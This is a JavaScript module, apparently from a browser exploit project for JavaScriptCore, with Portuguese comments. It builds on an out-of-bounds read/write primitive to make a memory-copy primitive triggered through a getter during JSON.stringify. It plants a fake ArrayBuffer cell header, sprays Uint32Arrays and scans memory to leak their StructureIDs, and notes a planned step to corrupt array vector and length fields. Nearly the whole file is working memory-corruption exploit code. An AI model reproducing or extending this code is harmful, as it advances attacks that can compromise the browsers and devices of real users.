// js/script3/testRetypeOOB_AB_ViaShadowCraft.mjs
import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';
import {
    triggerOOB_primitive,
    oob_array_buffer_real,
    oob_dataview_real,
    oob_write_absolute,
    oob_read_absolute,
    clearOOBEnvironment
} from '../core_exploit.mjs';
import { OOB_CONFIG, JSC_OFFSETS } from '../config.mjs';

// ============================================================
// DEFINIÇÕES DE CONSTANTES E VARIÁVEIS GLOBAIS
// ============================================================
const FNAME_MAIN = "ExploitLogic_v10.3"; // Versão atualizada

const GETTER_PROPERTY_NAME_COPY_V10_3 = "AAAA_GetterForMemoryCopy_v10_3"; // Nome único para o getter
const PLANT_OFFSET_0x6C_FOR_COPY_SRC = 0x6C; // Onde plantamos o LowDWORD do endereço fonte
// Constantes que estavam faltando ou com nome incorreto:
const CORRUPTION_OFFSET_TRIGGER = 0x70; // Usado pela primitiva de cópia
const CORRUPTION_VALUE_TRIGGER = new AdvancedInt64(0xFFFFFFFF, 0xFFFFFFFF); // Usado pela primitiva de cópia

const TARGET_COPY_DEST_OFFSET_IN_OOB = 0x100; // Onde o QWORD lido será copiado no oob_buffer

let getter_v10_3_called_flag = false; // Flag específica para esta versão do getter

// !!!!! IMPORTANTE: VOCÊ PRECISA DESCOBRIR ESTE VALOR !!!!!
let EXPECTED_UINT32ARRAY_STRUCTURE_ID = null;
const PLACEHOLDER_SID_UINT32ARRAY = 0xBADBAD00 | 31; // Novo placeholder


// ============================================================
// PRIMITIVA DE CÓPIA DE MEMÓRIA (readFromOOBOffsetViaCopy_v10_3)
// ============================================================
async function readFromOOBOffsetViaCopy_v10_3(dword_source_offset_to_read_from) {
    const FNAME_PRIMITIVE = `${FNAME_MAIN}.readFromOOBOffsetViaCopy_v10_3`;
    getter_v10_3_called_flag = false;

    if (!oob_array_buffer_real || !oob_dataview_real) {
        await triggerOOB_primitive();
    }

    const value_to_plant_at_0x6c = new AdvancedInt64(dword_source_offset_to_read_from, 0);
    oob_write_absolute(PLANT_OFFSET_0x6C_FOR_COPY_SRC, value_to_plant_at_0x6c, 8);

    const getterObjectForCopy = {
        get [GETTER_PROPERTY_NAME_COPY_V10_3]() {
            getter_v10_3_called_flag = true;
            try {
                const qword_at_0x68 = oob_read_absolute(0x68, 8);
                const effective_read_offset = qword_at_0x68.high();

                if (effective_read_offset === dword_source_offset_to_read_from) {
                    if (effective_read_offset >= 0 && effective_read_offset < oob_array_buffer_real.byteLength - 8) {
                        const data_read = oob_read_absolute(effective_read_offset, 8);
                        oob_write_absolute(TARGET_COPY_DEST_OFFSET_IN_OOB, data_read, 8);
                    } else {
                        logS3(`  [GETTER ${GETTER_PROPERTY_NAME_COPY_V10_3}] Offset de leitura efetivo ${toHex(effective_read_offset)} fora dos limites.`, "warn", FNAME_PRIMITIVE);
                        oob_write_absolute(TARGET_COPY_DEST_OFFSET_IN_OOB, AdvancedInt64.Zero, 8);
                    }
                } else {
                    logS3(`  [GETTER ${GETTER_PROPERTY_NAME_COPY_V10_3}] ERRO: effective_read_offset (${toHex(effective_read_offset)}) não corresponde ao dword_source_offset_to_read_from (${toHex(dword_source_offset_to_read_from)})!`, "critical", FNAME_PRIMITIVE);
                    oob_write_absolute(TARGET_COPY_DEST_OFFSET_IN_OOB, new AdvancedInt64(0xBADBAD, 0xBADBAD), 8);
                }
            } catch (e_getter) {
                logS3(`  [GETTER ${GETTER_PROPERTY_NAME_COPY_V10_3}] Erro interno: ${e_getter.message}`, "error", FNAME_PRIMITIVE);
                try {oob_write_absolute(TARGET_COPY_DEST_OFFSET_IN_OOB, new AdvancedInt64(0xDEADDEAD,0xBADBAD), 8); } catch(e){}
            }
            return "getter_copy_v10_3_done";
        }
    };

    // Usar as constantes globais CORRUPTION_OFFSET_TRIGGER e CORRUPTION_VALUE_TRIGGER
    oob_write_absolute(CORRUPTION_OFFSET_TRIGGER, CORRUPTION_VALUE_TRIGGER, 8);
    await PAUSE_S3(20);

    try {
        JSON.stringify(getterObjectForCopy);
    } catch (e) { /* Ignora */ }

    if (!getter_v10_3_called_flag) {
        logS3(`ALERTA: Getter (${GETTER_PROPERTY_NAME_COPY_V10_3}) NÃO foi chamado!`, "error", FNAME_PRIMITIVE);
        return null;
    }
    return oob_read_absolute(TARGET_COPY_DEST_OFFSET_IN_OOB, 8);
}

// ============================================================
// FUNÇÃO PARA LER StructureID USANDO A PRIMITIVA DE CÓPIA (v10.3)
// ============================================================
async function getStructureIDFromOOB_v10_3(offset_of_jscell_in_oob) {
    const FNAME_GET_SID = `${FNAME_MAIN}.getStructureIDFromOOB_v10_3`;
    
    if (offset_of_jscell_in_oob < 0 || offset_of_jscell_in_oob >= oob_array_buffer_real.byteLength - 8) {
        return null;
    }

    const copied_qword = await readFromOOBOffsetViaCopy_v10_3(offset_of_jscell_in_oob);

    if (copied_qword &&
        !(copied_qword.low() === 0xBADBAD && copied_qword.high() === 0xDEADDEAD) &&
        !(copied_qword.low() === 0xBADBAD && copied_qword.high() === 0xBADBAD) ) { // Checagem de erro adicional
        const potential_sid = copied_qword.low();
        return potential_sid;
    }
    return null;
}

// ============================================================
// FUNÇÃO PRINCIPAL DE INVESTIGAÇÃO (v10.3)
// ============================================================
export async function sprayAndInvestigateObjectExposure() {
    const FNAME_CURRENT_TEST = `${FNAME_MAIN}.discoverAndCorrupt_v10.3`;
    logS3(`--- Iniciando ${FNAME_CURRENT_TEST}: Descoberta de SID com Primitiva de Cópia Corrigida ---`, "test", FNAME_CURRENT_TEST);

    let sprayedObjects = [];

    try {
        await triggerOOB_primitive();
        logS3("Ambiente OOB inicializado.", "info", FNAME_CURRENT_TEST);
        logS3(`   AVISO IMPORTANTE: Tentando descobrir StructureID de Uint32Array. Se falhar, um placeholder (${toHex(PLACEHOLDER_SID_UINT32ARRAY)}) será usado.`, "warn", FNAME_CURRENT_TEST);

        // --- PASSO 1: Validar a primitiva de leitura de SID com um ArrayBuffer (SID conhecido) ---
        logS3("PASSO 1: Validando leitura de SID com ArrayBuffer...", "info", FNAME_CURRENT_TEST);
        const known_ab_sid = JSC_OFFSETS.ArrayBuffer.KnownStructureIDs.ArrayBuffer_STRUCTURE_ID;
        if (typeof known_ab_sid !== 'number') {
            logS3("ERRO: ArrayBuffer_STRUCTURE_ID não definido!", "critical", FNAME_CURRENT_TEST); return;
        }
        logS3(`  StructureID conhecido para ArrayBuffer: ${toHex(known_ab_sid)}`, "info", FNAME_CURRENT_TEST);

        const FAKE_AB_CELL_OFFSET = 0x300;
        // O JSCell header é [FLAGS | ID]. Se ID é 2 e flags são 01000000 (exemplo), o DWORD baixo é 0x01000002
        const fake_ab_jscell_qword = new AdvancedInt64(known_ab_sid, 0x01000100); // ID nos bits baixos, flags de exemplo nos altos da parte baixa
        oob_write_absolute(FAKE_AB_CELL_OFFSET, fake_ab_jscell_qword, 8);
        logS3(`  JSCell FALSO de ArrayBuffer escrito em ${toHex(FAKE_AB_CELL_OFFSET)}: ${fake_ab_jscell_qword.toString(true)}`, "info", FNAME_CURRENT_TEST);
        
        let sid_read_from_fake_ab = await getStructureIDFromOOB_v10_3(FAKE_AB_CELL_OFFSET);

        if (sid_read_from_fake_ab !== null) {
            logS3(`  SID lido (do local de cópia) após tentar ler de ${toHex(FAKE_AB_CELL_OFFSET)}: ${toHex(sid_read_from_fake_ab)}`, "leak", FNAME_CURRENT_TEST);
            if (sid_read_from_fake_ab === fake_ab_jscell_qword.low()) { // Comparar com o DWORD baixo plantado
                logS3("    SUCESSO NA VALIDAÇÃO: SID do ArrayBuffer FALSO lido corretamente!", "good", FNAME_CURRENT_TEST);
            } else {
                logS3(`    AVISO VALIDAÇÃO: SID lido (${toHex(sid_read_from_fake_ab)}) não corresponde ao plantado (${toHex(fake_ab_jscell_qword.low())}).`, "warn", FNAME_CURRENT_TEST);
            }
        } else {
            logS3("    Falha ao ler SID do ArrayBuffer FALSO para validação (primitiva pode ter falhado).", "error", FNAME_CURRENT_TEST);
        }
        await PAUSE_S3(100);

        // --- PASSO 2: Pulverizar Uint32Arrays e tentar encontrar seus StructureIDs ---
        logS3("PASSO 2: Pulverizando Uint32Arrays e tentando encontrar seus StructureIDs...", "info", FNAME_CURRENT_TEST);
        const NUM_U32_SPRAY = 100;
        sprayedObjects = [];
        for (let i = 0; i < NUM_U32_SPRAY; i++) {
            sprayedObjects.push(new Uint32Array(8));
        }
        logS3(`  ${NUM_U32_SPRAY} Uint32Arrays pulverizados.`, "info", FNAME_CURRENT_TEST);
        await PAUSE_S3(300);

        let found_sids_map = {};
        const SCAN_START = 0x100; 
        const SCAN_END = Math.min(0x2800, oob_array_buffer_real.byteLength - 8);
        const SCAN_STEP_SID = 0x10; 

        logS3(`  Escaneando de ${toHex(SCAN_START)} a ${toHex(SCAN_END)} por SIDs... (Pode levar um tempo)`, "info", FNAME_CURRENT_TEST);
        for (let offset = SCAN_START; offset < SCAN_END; offset += SCAN_STEP_SID) {
            let sid = await getStructureIDFromOOB_v10_3(offset);
            if (sid !== null && sid !== 0 && sid !== 0xFFFFFFFF && 
                (sid & 0xFFFF0000) !== 0xCAFE0000 && // Não é o padrão de preenchimento SCAN_FILL_PATTERN
                (sid & 0xFFFFFF00) !== (known_ab_sid & 0xFFFFFF00)) { // Não é um ArrayBuffer
                logS3(`    Offset ${toHex(offset)}: SID Potencial = ${toHex(sid)}`, "leak", FNAME_CURRENT_TEST);
                found_sids_map[sid] = (found_sids_map[sid] || 0) + 1;
            }
            if (offset > SCAN_START && offset % (SCAN_STEP_SID * 20) === 0) {
                logS3(`    Scan em ${toHex(offset)}...`, "info", FNAME_CURRENT_TEST);
                await PAUSE_S3(10);
            }
        }

        let most_frequent_sid_val = null; let max_freq = 0;
        for (const sid_key in found_sids_map) {
            const current_sid = parseInt(sid_key);
            if (found_sids_map[current_sid] > max_freq) {
                max_freq = found_sids_map[current_sid];
                most_frequent_sid_val = current_sid;
            }
        }

        if (most_frequent_sid_val !== null && max_freq > 2) {
            EXPECTED_UINT32ARRAY_STRUCTURE_ID = most_frequent_sid_val;
            logS3(`  !!!! StructureID MAIS FREQUENTE (candidato para Uint32Array): ${toHex(EXPECTED_UINT32ARRAY_STRUCTURE_ID)} (contagem: ${max_freq}) !!!!`, "vuln", FNAME_CURRENT_TEST);
            logS3("    >>>> COPIE ESTE VALOR PARA A CONSTANTE EXPECTED_UINT32ARRAY_STRUCTURE_ID NO TOPO DO ARQUIVO! <<<<", "critical", FNAME_CURRENT_TEST);
            document.title = `U32 SID? ${toHex(EXPECTED_UINT32ARRAY_STRUCTURE_ID)}`;
        } else {
            logS3("  Nenhum candidato a StructureID de Uint32Array proeminente encontrado via scan.", "warn", FNAME_CURRENT_TEST);
            EXPECTED_UINT32ARRAY_STRUCTURE_ID = PLACEHOLDER_SID_UINT32ARRAY;
        }
        logS3(`EXPECTED_UINT32ARRAY_STRUCTURE_ID (final para este run): ${toHex(EXPECTED_UINT32ARRAY_STRUCTURE_ID)}`, "info", FNAME_CURRENT_TEST);

        // --- PASSO 3: (Futuro) Usar o SID descoberto para corromper m_vector/m_length ---
        // ...

    } catch (e) {
        logS3(`ERRO CRÍTICO em ${FNAME_CURRENT_TEST}: ${e.message}`, "critical", FNAME_CURRENT_TEST);
        if (e.stack) logS3(`Stack: ${e.stack}`, "critical", FNAME_CURRENT_TEST);
        document.title = `${FNAME_MAIN} FALHOU!`;
    } finally {
        sprayedObjects = [];
        clearOOBEnvironment();
        logS3(`--- ${FNAME_CURRENT_TEST} Concluído ---`, "test", FNAME_CURRENT_TEST);
    }
}
